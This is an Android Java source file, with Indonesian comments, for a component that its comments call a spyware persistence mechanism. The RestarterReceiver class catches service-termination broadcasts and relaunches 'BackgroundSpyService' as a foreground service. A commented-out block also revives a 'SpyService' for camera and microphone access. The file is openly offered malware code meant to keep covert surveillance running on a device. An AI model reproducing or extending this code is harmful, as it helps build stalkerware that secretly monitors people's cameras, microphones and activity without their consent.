package com.nullx.pp;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.Build;
import android.util.Log;

/**
 * RestarterReceiver: Menangkap sinyal terminasi layanan dan menghidupkannya kembali.
 * Menjamin persistensi fitur spyware di latar belakang.
 */
public class RestarterReceiver extends BroadcastReceiver {
    private static final String TAG = "CRPT.Restarter";

    @Override
    public void onReceive(Context context, Intent intent) {
        String action = intent.getAction();
        Log.i(TAG, "Menerima sinyal: " + (action != null ? action : "NULL"));

        // Intent untuk menghidupkan kembali layanan utama
        Intent spyServiceIntent = new Intent(context, BackgroundSpyService.class);
        
        try {
            // Cek versi Android untuk menentukan cara eksekusi foreground service
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                // Android 8.0 ke atas wajib menggunakan startForegroundService
                context.startForegroundService(spyServiceIntent);
            } else {
                context.startService(spyServiceIntent);
            }
            Log.i(TAG, "Berhasil memicu restart BackgroundSpyService.");
        } catch (Exception e) {
            Log.e(TAG, "Gagal merestart service: " + e.getMessage());
        }

        // Jika lo ingin membangunkan SpyService sensitif (Camera/Mic) juga:
        /*
        Intent coreSpyIntent = new Intent(context, SpyService.class);
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            context.startForegroundService(coreSpyIntent);
        } else {
            context.startService(coreSpyIntent);
        }
        */
    }
}